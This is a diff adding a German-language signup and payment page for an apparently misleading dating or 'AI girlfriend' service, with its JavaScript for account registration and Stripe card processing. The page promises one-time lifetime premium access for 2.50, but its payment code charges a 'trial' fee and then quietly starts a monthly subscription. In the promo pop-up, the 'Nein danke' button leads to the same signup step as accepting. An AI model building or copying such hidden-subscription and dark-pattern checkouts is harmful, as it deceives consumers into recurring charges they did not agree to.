@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
+  <title>Justsignup</title>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-FDQ6REQWS8');
+  </script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd;
+      --cta1:#ffd76b; --cta2:#ffb429; --radius:16px; --green:#12b886; --red:#e03131;
+    }
+    *{box-sizing:border-box}
+    body{ margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+          background:var(--bg); color:#111; display:flex; flex-direction:column;
+          align-items:center; justify-content:flex-start; padding:18px 14px 40px;}
+    .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
+    .card{ width:min(720px,100%); background:var(--card); border:1px solid var(--line);
+           border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05);
+           margin-inline:auto;}
+    .title{ font-size:30px; font-weight:900; text-align:center; margin:6px 0 12px; 
+            letter-spacing:.2px; color:#e91e63; } /* pink title */
+    .sub{ text-align:center; color:var(--muted); margin-top:-2px; margin-bottom:16px }
+
+    /* Video hero */
+    .video-wrap{ position:relative; border-radius:18px; overflow:hidden; border:1px solid #eee; background:#000;
+                 max-width:35%; margin:0 auto; }
+    .video-wrap video{ width:100%; height:auto; display:block; }
+
+    /* Lifetime headline */
+    .lifetime-offer {
+      text-align: center;
+      font-size: 28px;
+      font-weight: 900;
+      color: #b00020;
+      margin: 20px 0 10px;
+    }
+    .lifetime-offer .old-price {
+      color: #888;
+      font-size: 22px;
+      font-weight: 700;
+      margin-left: 10px;
+      position: relative;
+    }
+    .lifetime-offer .old-price::after {
+      content: "";
+      position: absolute;
+      left: -3px;
+      right: -3px;
+      top: 50%;
+      height: 2px;
+      background: linear-gradient(90deg,#c9c9c9,#999);
+      transform: rotate(-6deg);
+    }
+
+    /* Pricing row */
+    .pricing{ display:flex; align-items:center; justify-content:center; gap:12px; margin:12px 0 6px }
+    .was{ color:#888; position:relative; font-weight:700; }
+    .was::after{ content:""; position:absolute; left:-3px; right:-3px; top:50%; height:2px; background:linear-gradient(90deg,#c9c9c9,#999); transform:rotate(-6deg);}
+    .now{ font-weight:900; color:#0b6b3a; background:#e9f8f0; border:1px solid #b7ecd2;
+          padding:6px 10px; border-radius:10px; font-size:18px;}
+    .save{ font-size:12px; color:#0b6b3a; font-weight:800; letter-spacing:.2px;
+           background:#e9f8f0; border:1px dashed #9ddfbe; padding:4px 8px; border-radius:999px;}
+
+    /* Inputs & buttons */
+    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
+    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
+    .btn{ width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
+          font-weight:900; cursor:pointer; font-size:16px;
+          background:linear-gradient(180deg,var(--cta1),var(--cta2));
+          box-shadow:0 8px 18px rgba(255,174,15,.25);}
+    .btn-row{ display:flex; gap:12px; margin-top:12px }
+    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }
+
+    /* Steps */
+    .step{ display:none }
+    .step[aria-hidden="false"]{ display:block }
+
+    /* Stripe Elements styling */
+    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
+    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
+
+    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
+    .brands img{height:22px}
+    .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
+
+    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
+    #err[aria-hidden="false"]{ display:block; }
+
+    /* Loading */
+    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
+    .loading-overlay[aria-hidden="false"]{ display:flex }
+    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
+    .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
+    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
+    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
+    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
+
+    /* ---------- Ethical promo modal ---------- */
+    .promo-backdrop{
+      position:fixed; inset:0; background:rgba(0,0,0,.45);
+      display:none; align-items:center; justify-content:center; z-index:9998;
+    }
+    .promo-backdrop[aria-hidden="false"]{ display:flex; }
+    .promo-modal{
+      width:min(92vw,520px); background:#fff; border:1px solid var(--line);
+      border-radius:18px; box-shadow:0 14px 30px rgba(0,0,0,.18);
+      padding:20px; position:relative;
+    }
+    .promo-close{
+      position:absolute; top:10px; right:10px; background:#eee; border:1px solid #ddd;
+      border-radius:999px; width:34px; height:34px; display:grid; place-items:center; cursor:pointer;
+    }
+    .promo-title{ font-size:22px; font-weight:900; margin:6px 0 6px; text-align:center; }
+    .promo-sub{ text-align:center; color:#555; margin:0 0 10px; }
+    .promo-pricing{ display:flex; align-items:center; justify-content:center; gap:12px; margin:10px 0; }
+    .promo-was{ color:#888; position:relative; font-weight:700; }
+    .promo-was::after{ content:""; position:absolute; left:-3px; right:-3px; top:50%; height:2px; background:linear-gradient(90deg,#c9c9c9,#999); transform:rotate(-6deg);}
+    .promo-now{ font-weight:900; color:#0b6b3a; background:#e9f8f0; border:1px solid #b7ecd2; padding:6px 10px; border-radius:10px; font-size:18px;}
+    .promo-actions{ display:flex; gap:10px; margin-top:12px; }
+
+    /* Features list */
+    .features{
+      background:#fff; border:1px solid #e7e7e7; border-radius:12px; padding:12px; margin:10px 0 14px;
+    }
+    .features h3{ margin:0 0 8px; font-size:16px; font-weight:800; color:#222; }
+    .features ul{ margin:0; padding-left:18px; }
+    .features li{ margin:6px 0; }
+
+    /* Phone prefix + number layout */
+    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
+    @media (max-width:520px){ .phone-wrap{ grid-template-columns:1fr; } }
+
+    /* Address layout */
+    .addr-grid{ display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:10px 0 0; }
+    .addr-grid .full{ grid-column:1/-1; }
+  </style>
+</head>
+<body>
+
+<!-- GoAffPro loader (nicht entfernen – Tracking auf Folgeseite) -->
+<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+
+  <!-- ---------- Ethical promo modal ---------- -->
+  <div id="promo" class="promo-backdrop" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="promoTitle" aria-describedby="promoDesc">
+    <div class="promo-modal">
+      <button class="promo-close" id="promoClose" aria-label="Schließen">✕</button>
+      <div id="promoTitle" class="promo-title">GLÜCKWUNSCH!</div>
+      <p id="promoDesc" class="promo-sub">
+        Du wurdest ausgewählt, ALLE PREMIUM-FUNKTIONEN im Wert von
+        <span data-price="99" data-precision="0">99</span>
+        für nur
+        <span data-price="2.5" data-precision="2">2.50</span>
+        zu erhalten!
+      </p>
+      <div class="promo-pricing">
+        <span class="promo-was"><span data-price="99" data-precision="0">99</span></span>
+        <span class="promo-now">Jetzt <span data-price="2.5" data-precision="2">2.50</span></span>
+      </div>
+      <p class="promo-sub">Lebenslanger Zugriff: unbegrenzte Nachrichten, HD-Fotos, Sprachanrufe und Kontakt-Sharing. Community 18+. Es gelten Bedingungen.</p>
+      <div class="promo-actions">
+        <button class="btn" id="promoAccept" style="flex:1">Premium-Optionen ansehen</button>
+        <button class="btn muted-btn" id="promoDismiss" style="flex:1">Nein danke</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="shell">
+
+    <!-- SCHRITT 1 -->
+    <section id="step1" class="card step" aria-hidden="false">
+      <h1 class="title">Mädchen suchen Treffen!!</h1>
+      <p class="sub">Zeitlich begrenztes Angebot: Voller Premium-Zugang für 2,50 €!</p>
+
+      <div class="video-wrap" aria-label="AI-Freundin Video">
+        <video src="video1.mp4" autoplay loop muted playsinline preload="metadata"></video>
+      </div>
+
+      <!-- Preisanzeige -->
+      <div id="pricing" class="pricing" style="margin-top:14px">
+        <span class="was"><span data-price="99" data-precision="0">99</span></span>
+        <span class="now">Jetzt <span data-price="2.5" data-precision="2">2.50</span></span>
+        <span class="save">Spare 97 %</span>
+      </div>
+
+      <!-- Lifetime offer -->
+      <div class="lifetime-offer">
+        EINMALIGES ANGEBOT: LEBENSLANGER ZUGANG
+      </div>
+
+      <div class="grid" style="margin-top:10px">
+        <input class="input" id="nameInput" placeholder="Vollständiger Name" autocomplete="name" required />
+        <input class="input" id="emailInput" type="email" placeholder="du@beispiel.com" autocomplete="email" required />
+        <!-- Passwort (volle Breite) -->
+        <input class="input" id="passwordInput" type="password" placeholder="Passwort erstellen" autocomplete="new-password" required style="grid-column: 1 / -1;" />
+        <!-- Vorwahl + Nummer -->
+        <div class="phone-wrap" style="grid-column: 1 / -1;">
+          <select id="phonePrefix" class="input" aria-label="Ländervorwahl"></select>
+          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Telefonnummer" autocomplete="tel-national" />
+        </div>
+      </div>
+
+      <!-- versteckte Defaults für /api/register -->
+      <input type="hidden" id="gender" value="nonbinary"/>
+      <input type="hidden" id="lookingFor" value="any"/>
+      <input type="hidden" id="phone" value=""/>
+
+      <div class="btn-row">
+        <button id="nextBtn" class="btn">Nächster Schritt →</button>
+      </div>
+      <p class="trust-text">Deine E-Mail wird niemals geteilt. 100 % Datenschutz.</p>
+    </section>
+
+    <!-- SCHRITT 2 -->
+    <section id="step2" class="card step" aria-hidden="true">
+      <h2 class="title">Sichere Zahlung</h2>
+      <p class="sub">Deine Daten sind sicher — mit Stripe.</p>
+
+      <!-- Was du bekommst -->
+      <div class="features" aria-label="Liste der Premium-Funktionen">
+        <h3>Das bekommst du:</h3>
+        <ul>
+          <li>Unbegrenzte Nachrichten und Treffen</li>
+          <li>Unbegrenztes Teilen von HD-Fotos</li>
+          <li>Kontakt- und Social-Sharing</li>
+          <li>Geschenke</li>
+          <li>…und vieles mehr!</li>
+        </ul>
+      </div>
+
+      <!-- Rechnungsadresse -->
+      <div class="addr-grid" aria-label="Rechnungsadresse">
+        <input id="addr1" class="input full" placeholder="Straße und Hausnummer" autocomplete="address-line1">
+        <input id="city" class="input" placeholder="Stadt" autocomplete="address-level2" list="cityOptions">
+        <datalist id="cityOptions"></datalist>
+        <input id="region" class="input" placeholder="Bundesland / Region" autocomplete="address-level1">
+        <input id="postal" class="input" placeholder="Postleitzahl" autocomplete="postal-code">
+        <select id="country" class="input">
+          <option value="US" selected>Vereinigte Staaten</option>
+          <option value="GB">Vereinigtes Königreich</option>
+          <option value="CA">Kanada</option>
+          <option value="AU">Australien</option>
+          <option value="IE">Irland</option>
+          <option value="NZ">Neuseeland</option>
+          <option value="DE">Deutschland</option>
+          <option value="FR">Frankreich</option>
+          <option value="IT">Italien</option>
+          <option value="CZ">Tschechien</option>
+          <option value="PL">Polen</option>
+          <option value="NL">Niederlande</option>
+          <option value="SE">Schweden</option>
+          <option value="NO">Norwegen</option>
+          <option value="DK">Dänemark</option>
+          <option value="FI">Finnland</option>
+          <option value="ES">Spanien</option>
+        </select>
+      </div>
+
+      <div id="gpay-button"></div>
+
+      <div class="label">Kartennummer</div>
+      <div id="card-number" class="el"></div>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
+        <div>
+          <div class="label">Ablaufdatum</div>
+          <div id="card-expiry" class="el"></div>
+        </div>
+        <div>
+          <div class="label">CVC</div>
+          <div id="card-cvc" class="el"></div>
+        </div>
+      </div>
+
+      <div id="err" role="alert" aria-hidden="true"></div>
+
+      <div class="btn-row">
+        <button id="backBtn" class="btn muted-btn">← Zurück</button>
+        <button class="btn" id="payNow">Jetzt freischalten</button>
+      </div>
+
+      <div class="brands">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
+      </div>
+
+      <p class="trust-text">🔒 256-Bit-SSL · Mit Stripe · 30-Tage Geld-zurück-Garantie</p>
+    </section>
+  </div>
+
+  <!-- Lade-Overlay -->
+  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+    <div class="loading-box">
+      <div class="loading-title">Zahlung wird verarbeitet…</div>
+      <div class="progress-wrap"><div class="progress-bar"></div></div>
+      <p class="sub">Bitte warten, das kann ein paar Sekunden dauern.</p>
+    </div>
+  </div>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* ---------- Schritt-Navigation ---------- */
+    const step1=document.getElementById('step1'),step2=document.getElementById('step2');
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const passwordInput=document.getElementById('passwordInput');
+
+    async function ensureAccount() {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+      if (!email || !password) { throw new Error("Bitte E-Mail und Passwort eingeben."); }
+
+      const payload = {
+        email,
+        password,
+        gender: document.getElementById('gender').value || "nonbinary",
+        lookingFor: document.getElementById('lookingFor').value || "any",
+        phone: document.getElementById('phone').value || ""
+      };
+
+      try {
+        const res = await fetch("/api/register", {
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body: JSON.stringify(payload)
+        });
+
+        // Angelegt → ok; Existiert schon (400) → auch ok, weiter
+        if (res.status === 201) return true;
+
+        const data = await res.json().catch(()=>({}));
+        if (res.status === 400 && data && /exists/i.test(data.error||"")) {
+          return true;
+        }
+
+        throw new Error(data?.error || "Konto konnte nicht erstellt werden");
+      } catch (e) {
+        alert(e.message || "Problem beim Erstellen des Kontos. Bitte erneut versuchen.");
+        throw e;
+      }
+    }
+
+    document.getElementById('nextBtn').onclick=async()=>{ 
+      if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Bitte Daten eingeben");return}
+
+      // Telefon vor der Registrierung zusammensetzen
+      try{
+        const raw = (document.getElementById('phoneNumber')?.value||'').replace(/[^\d]/g,'');
+        const pref = (document.getElementById('phonePrefix')?.value||'+1').trim();
+        document.getElementById('phone').value = raw ? (pref + raw) : "";
+      }catch{}
+
+      try {
+        await ensureAccount(); // Konto auf deinem Render-Server anlegen
+      } catch {
+        return;
+      }
+      localStorage.setItem("checkout_name",nameInput.value);
+      localStorage.setItem("checkout_email",emailInput.value);
+      step1.setAttribute("aria-hidden","true");
+      step2.setAttribute("aria-hidden","false");
+      window.scrollTo({top:0,behavior:'smooth'});
+    };
+
+    document.getElementById('backBtn').onclick=()=>{ 
+      step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
+      window.scrollTo({top:0,behavior:'smooth'});
+    };
+
+    /* ---------- Währungssymbol per IP (nur Anzeige) ---------- */
+    (function setCurrencyByIP(){
+      const EU = new Set([
+        'AT','BE','BG','HR','CY','CZ','DK','EE','FI','FR','DE','GR','HU','IE','IT',
+        'LV','LT','LU','MT','NL','PL','PT','RO','SK','SI','ES','SE'
+      ]);
+      function symbolFor(cc){
+        if(cc==='DE') return '€ ';
+        if(cc==='US') return '$';
+        if(cc==='GB' || cc==='UK') return '£';
+        if(EU.has(cc)) return '€ ';
+        return '€ ';
+      }
+      function fmt(amount, precision, symbol){
+        const n = Number(amount);
+        const fixed = (precision != null) ? n.toFixed(Number(precision)) : (Number.isInteger(n) ? String(n) : n.toFixed(2));
+        return symbol + fixed.replace(/\.00$/,'');
+      }
+      function apply(symbol){
+        document.querySelectorAll('[data-price]').forEach(el=>{
+          const amt = el.getAttribute('data-price');
+          const prec = el.getAttribute('data-precision');
+          el.textContent = fmt(amt, prec, symbol);
+        });
+      }
+      apply('€ ');
+      fetch('https://ipapi.co/json/')
+        .then(r => r.ok ? r.json() : Promise.reject())
+        .then(data => apply(symbolFor((data && (data.country || data.country_code)) || 'DE')))
+        .catch(() => {
+          try {
+            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'de-DE';
+            const cc = (loc.split('-')[1] || 'DE').toUpperCase();
+            apply(symbolFor(cc));
+          } catch {}
+        });
+    })();
+
+    /* ---------- Telefonvorwahl per IP (garantiert IT/CZ/PL/DE/FR) ---------- */
+    (function phonePrefixByIP(){
+      const selectEl = document.getElementById('phonePrefix');
+      if(!selectEl) return;
+
+      // Vollständige Liste wie im Original:
+      const COUNTRIES = [/* … full list unchanged … */];
+
+      // Sicherstellen, dass diese 5 Länder vorhanden sind (deutsche Bezeichnungen)
+      const ENSURE = [
+        { cc:'IT', code:'+39',  name:'Italien'   },
+        { cc:'CZ', code:'+420', name:'Tschechien'},
+        { cc:'PL', code:'+48',  name:'Polen'     },
+        { cc:'DE', code:'+49',  name:'Deutschland' },
+        { cc:'FR', code:'+33',  name:'Frankreich'}
+      ];
+
+      function ensureFivePresent(){
+        const existing = new Set(Array.from(selectEl.options).map(o=>o.value));
+        ENSURE.forEach(({code,name})=>{
+          if(!existing.has(code)){
+            selectEl.append(new Option(`${code} — ${name}`, code));
+          }
+        });
+      }
+
+      function buildOptions(preferredCC, preferredCalling){
+        selectEl.innerHTML = '';
+        const added = new Set();
+
+        // Falls API die exakte Vorwahl liefert (z. B. +49), ganz nach oben
+        if (preferredCalling){
+          const known = COUNTRIES.find(c=>c.code===preferredCalling) || COUNTRIES.find(c=>c.cc===preferredCC);
+          const name = known ? (known.name || 'Land') : 'Land';
+          const opt = new Option(`${preferredCalling} — ${name}`, preferredCalling, true, true);
+          selectEl.append(opt); added.add(preferredCalling);
+        } else if (preferredCC){
+          const item = COUNTRIES.find(c=>c.cc===preferredCC);
+          if (item){
+            const opt = new Option(`${item.code} — ${item.name}`, item.code, true, true);
+            selectEl.append(opt); added.add(item.code);
+          }
+        }
+
+        // Rest hinzufügen
+        COUNTRIES.forEach(({code,name})=>{
+          if (added.has(code)) return;
+          selectEl.append(new Option(`${code} — ${name}`, code));
+          added.add(code);
+        });
+
+        ensureFivePresent();
+        if (!selectEl.value) selectEl.value = '+49';
+      }
+
+      // Schnelles Seed mit DE
+      try { buildOptions('DE', null); } catch {}
+
+      // Mit IP verfeinern
+      fetch('https://ipapi.co/json/')
+        .then(r=>r.ok?r.json():Promise.reject())
+        .then(data=>{
+          const cc = ((data&&(data.country||data.country_code))||'DE').toUpperCase();
+          const calling = (data&&data.country_calling_code)||null;
+          buildOptions(cc, calling);
+
+          // Land-Select setzen & Städte-Vorschläge laden
+          try{
+            const countrySel = document.getElementById('country');
+            if (countrySel && Array.from(countrySel.options).some(o=>o.value===cc)){
+              countrySel.value = cc;
+              window.__populateCityOptions && window.__populateCityOptions(cc);
+            }
+          }catch{}
+        })
+        .catch(()=>{
+          try{
+            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'de-DE';
+            const cc = (loc.split('-')[1]||'DE').toUpperCase();
+            buildOptions(cc, null);
+          }catch{}
+        });
+    })();
+
+    /* ---------- Städtelisten (IT, CZ, PL, DE, FR) – nur Vorschläge ---------- */
+    (function countryCityHints(){
+      const COUNTRY_CITIES = {
+        IT: ['Rom','Mailand','Neapel','Turin','Palermo','Bologna','Florenz','Genua'],
+        CZ: ['Prag','Brünn','Ostrau','Pilsen','Liberec','Olmütz','Budweis'],
+        PL: ['Warschau','Krakau','Breslau','Danzig','Posen','Łódź','Stettin','Lublin'],
+        DE: ['Berlin','München','Hamburg','Köln','Frankfurt','Stuttgart','Düsseldorf','Leipzig'],
+        FR: ['Paris','Marseille','Lyon','Toulouse','Nizza','Nantes','Straßburg','Montpellier']
+      };
+
+      const datalist = document.getElementById('cityOptions');
+      const countrySel = document.getElementById('country');
+
+      function populate(cc){
+        if (!datalist) return;
+        datalist.innerHTML = '';
+        const cities = COUNTRY_CITIES[cc] || [];
+        cities.forEach(c => {
+          const opt = document.createElement('option');
+          opt.value = c;
+          datalist.appendChild(opt);
+        });
+      }
+
+      // Für Telefon-IIFE verfügbar machen
+      window.__populateCityOptions = populate;
+
+      // Initial befüllen
+      try { populate(countrySel?.value || 'DE'); } catch {}
+
+      // Bei Länderwechsel aktualisieren
+      countrySel?.addEventListener('change', e => populate(e.target.value));
+
+      // Stadt per IP vorbelegen (User kann überschreiben)
+      fetch('https://ipapi.co/json/')
+        .then(r=>r.ok?r.json():Promise.reject())
+        .then(data=>{
+          if (data && data.city) {
+            const cityInput = document.getElementById('city');
+            if (cityInput && !cityInput.value) cityInput.value = data.city;
+          }
+        })
+        .catch(()=>{});
+    })();
+
+    /* ---------- Stripe (bezahlte Testphase → Abo) ---------- */
+    const TRIAL_INTENT_URL="https://charmr-jfmc.onrender.com/api/stripe/trial-charge-intent";
+    const START_MONTHLY_URL="https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial";
+    const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+
+    const stripe=Stripe(PUBLISHABLE_KEY),elements=stripe.elements();
+    const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number");cardExpiry.mount("#card-expiry");cardCvc.mount("#card-cvc");
+    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
+    function showError(m){$err.textContent=m;$err.style.display="block"}
+    function hideError(){$err.textContent="";$err.style.display="none"}
+    function showLoading(){overlay.setAttribute("aria-hidden","false")}
+    function hideLoading(){overlay.setAttribute("aria-hidden","true")}
+
+    document.getElementById("payNow").onclick=async()=>{
+      hideError();showLoading();
+      try{
+        // Telefon (Vorwahl + Ziffern)
+        let phone = '';
+        try {
+          const raw = (document.getElementById('phoneNumber')?.value||'').replace(/[^\d]/g,'');
+          const pref = (document.getElementById('phonePrefix')?.value||'+49').trim();
+          phone = raw ? (pref + raw) : '';
+        } catch {}
+
+        // Rechnungsadresse
+        const address = {
+          line1: (document.getElementById('addr1')?.value||'').trim() || undefined,
+          city: (document.getElementById('city')?.value||'').trim() || undefined,
+          state: (document.getElementById('region')?.value||'').trim() || undefined,
+          postal_code: (document.getElementById('postal')?.value||'').trim() || undefined,
+          country: (document.getElementById('country')?.value||'').trim() || undefined
+        };
+
+        // 1) PaymentMethod aus Elements erstellen
+        const pmRes = await stripe.createPaymentMethod({
+          type:"card",
+          card:cardNumber,
+          billing_details:{
+            name:nameInput.value,
+            email:emailInput.value,
+            phone: phone || undefined,
+            address
+          }
+        });
+        if(pmRes.error){ throw new Error(pmRes.error.message); }
+        const paymentMethodId = pmRes.paymentMethod.id;
+
+        // 2) Server: PaymentIntent für Testgebühr erzeugen
+        const r1 = await fetch(TRIAL_INTENT_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentMethodId,
+            name:nameInput.value,
+            email:emailInput.value
+          })
+        });
+        const d1 = await r1.json();
+        if(!r1.ok || !d1.clientSecret){ 
+          throw new Error(d1.error || "Zahlung fehlgeschlagen beim Erstellen der Testgebühr."); 
+        }
+
+        // 3) Intro-Charge bestätigen (SCA falls nötig)
+        const conf = await stripe.confirmCardPayment(d1.clientSecret);
+        if(conf.error){ throw new Error(conf.error.message); }
+        if(!(conf.paymentIntent && conf.paymentIntent.status==="succeeded")){
+          throw new Error("Zahlung nicht abgeschlossen");
+        }
+
+        // 4) Monatsabo starten (serverseitig konfiguriert)
+        const r2 = await fetch(START_MONTHLY_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({ paymentIntentId: conf.paymentIntent.id })
+        });
+        const d2 = await r2.json();
+        if(!r2.ok){ throw new Error(d2.error || "Abo konnte nicht gestartet werden"); }
+
+        // 5) Erfolg!
+        window.location.href="thankyou2.html";
+      }catch(err){
+        showError(err.message || "Zahlung fehlgeschlagen");
+      }finally{
+        hideLoading();
+      }
+    };
+
+    /* ---------- Promo-Modal: beide Buttons → Schritt 1 ---------- */
+    (function promoModal(){
+      const backdrop = document.getElementById('promo');
+      const closeBtn = document.getElementById('promoClose');
+      const dismissBtn = document.getElementById('promoDismiss');
+      const acceptBtn = document.getElementById('promoAccept');
+
+      const SEEN_KEY = 'promo_seen_v1';
+      if(!sessionStorage.getItem(SEEN_KEY)){
+        setTimeout(()=>backdrop.setAttribute('aria-hidden','false'), 600);
+        sessionStorage.setItem(SEEN_KEY,'1');
+      }
+
+      function close(){ backdrop.setAttribute('aria-hidden','true'); }
+
+      function goToEmailStep(){
+        // Immer Schritt 1 (E-Mail) zeigen und Schritt 2 verstecken
+        document.getElementById('step1').setAttribute('aria-hidden','false');
+        document.getElementById('step2').setAttribute('aria-hidden','true');
+        window.scrollTo({top:0,behavior:'smooth'});
+        close();
+      }
+
+      closeBtn.addEventListener('click', close);
+      // Beide Buttons leiten zu Schritt 1
+      acceptBtn.addEventListener('click', goToEmailStep);
+      dismissBtn.addEventListener('click', goToEmailStep);
+
+      // Klick außerhalb → schließen
+      backdrop.addEventListener('click', (e)=>{ if(e.target === backdrop) close(); });
+
+      // Esc → schließen
+      document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') close(); });
+    })();
+  </script>
+</body>
+</html>
